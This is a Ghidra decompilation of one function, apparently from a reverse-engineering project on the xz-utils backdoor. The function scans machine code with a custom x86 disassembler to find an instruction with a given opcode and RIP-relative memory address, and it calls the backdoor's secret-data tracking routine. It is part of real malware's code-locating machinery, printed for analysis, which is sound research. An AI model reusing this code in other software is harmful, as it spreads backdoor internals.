// /home/kali/xzre-ghidra/xzregh/101060_find_instruction_with_mem_operand_ex.c
// Function: find_instruction_with_mem_operand_ex @ 0x101060
// Calling convention: __stdcall
// Prototype: BOOL __stdcall find_instruction_with_mem_operand_ex(u8 * code_start, u8 * code_end, dasm_ctx_t * dctx, int opcode, void * mem_address)


BOOL find_instruction_with_mem_operand_ex
               (u8 *code_start,u8 *code_end,dasm_ctx_t *dctx,int opcode,void *mem_address)

{
  int iVar1;
  BOOL BVar2;
  long lVar3;
  undefined4 *puVar4;
  byte bVar5;
  undefined4 local_80 [22];
  
  bVar5 = 0;
  BVar2 = secret_data_append_from_call_site((secret_data_shift_cursor_t)0xd6,4,0xe,0);
  if (BVar2 != 0) {
    puVar4 = local_80;
    for (lVar3 = 0x16; lVar3 != 0; lVar3 = lVar3 + -1) {
      *puVar4 = 0;
      puVar4 = puVar4 + (ulong)bVar5 * -2 + 1;
    }
    if (dctx == (dasm_ctx_t *)0x0) {
      dctx = (dasm_ctx_t *)local_80;
    }
    for (; code_start < code_end; code_start = code_start + 1) {
      BVar2 = x86_dasm(dctx,code_start,code_end);
      if ((((BVar2 != 0) &&
           (iVar1._0_1_ = dctx->_unknown810[0], iVar1._1_1_ = dctx->_unknown810[1],
           iVar1._2_1_ = dctx->_unknown810[2], iVar1._3_1_ = dctx->field_0x2b, iVar1 == opcode)) &&
          (((dctx->field2_0x10).field0.field11_0xc.modrm_word & 0xff00ff00) == 0x5000000)) &&
         ((mem_address == (void *)0x0 ||
          ((((dctx->field2_0x10).field0.flags2 & 1) != 0 &&
           ((u8 *)mem_address ==
            dctx->instruction + dctx->instruction_size + *(long *)dctx->_unknown812)))))) {
        return 1;
      }
    }
  }
  return 0;
}

